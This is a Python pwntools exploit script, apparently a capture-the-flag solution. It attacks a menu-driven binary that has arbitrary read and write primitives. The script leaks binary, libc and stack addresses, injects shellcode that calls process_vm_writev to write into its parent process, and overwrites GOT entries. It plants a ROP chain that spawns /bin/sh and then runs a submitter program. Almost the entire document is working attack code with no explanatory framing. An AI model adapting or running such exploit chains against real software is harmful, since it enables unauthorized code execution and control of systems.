from pwn import *

var = os.getenv("DEBUGINFOD_URLS")

binary_name = "challenge"
exe  = ELF(binary_name, checksec=True)
libc = ELF("/libc.so.6" if var is None else "libc.so.6", checksec=False)
context.binary = exe

ru  = lambda *x: r.recvuntil(*x)
rl  = lambda *x: r.recvline(*x)
rc  = lambda *x: r.recv(*x)
sla = lambda *x: r.sendlineafter(*x)
sa  = lambda *x: r.sendafter(*x)
sl  = lambda *x: r.sendline(*x)
sn  = lambda *x: r.send(*x)

if var is None:
    HOST = os.environ.get("HOST", "localhost")
    PORT = 31337
    r = connect(HOST, int(PORT))
elif args.GDB:
    r = gdb.debug(f"debug_dir/{binary_name}", """
		set follow-fork-mode parent
        c
    """, aslr=False)
else:
    # r = process(f"debug_dir/{binary_name}")
	r = connect("localhost", 31337)

def rww(addr):
	r.sendlineafter(b"Choice: ", b"1")
	r.sendlineafter(b"\n", b"%x" % addr)
	ru(b"Value: ")
	return int(rl(), 16)

def www(addr, val):
	r.sendlineafter(b"Choice: ", b"2")
	r.sendlineafter(b"\n", b"%x" % val)
	r.sendlineafter(b"\n", b"%x" % addr)

def exit_():
	r.sendlineafter(b"Choice: ", b"3")

leak1 = rww(0)
print(hex(leak1))
exe.address = rww(leak1 - 0x100) - 0x1220
print(hex(exe.address))

libc.address = rww(exe.got.puts) - libc.sym.puts
print(hex(libc.address))

def wwwp(addr, value):
	code  = shellcraft.getppid()
	code += f"""
		mov rbx, 0x{value:x}
		push rbx
		push rsp
		pop rbx

		push 0x8
		push rbx
		push rsp
		pop rsi
		mov rbx, {addr:#x}
		push rbx
		push 0x8
		push rbx
		push rsp
		pop r10

		mov rdi, rax
		push 0x137
		pop rax
		mov edx, 0x1
		mov r8, 0x1
		push 0x0
		pop r9
		syscall
	"""
	return asm(code)

environ = rww(libc.sym.environ)
print(hex(environ))
base = environ - 0x128
rop = ROP(libc)
rop.raw(rop.ret)
rop.system(next(libc.search(b"/bin/sh")))
chain = rop.chain()
while len(chain) % 8:
	chain += b"A"
blocks = [chain[i : i + 8] for i in range(0, len(chain), 8)]
code = wwwp(exe.got.kill, libc.address + 0x10e066)
for i, block in enumerate(blocks):
	code += wwwp(base + i * 8, u64(block))


while len(code) % 8:
	code += b"\xcc"

blocks = [code[i : i + 8] for i in range(0, len(code), 8)]
add = exe.bss()
for i, block in enumerate(blocks):
	www(add + i * 8, u64(block))

www(exe.got.usleep, add)

sleep(1)
exit_()

# r.interactive()
# after shell xd
r.sendline(b'./submitter')
print(r.recvall(timeout=1))
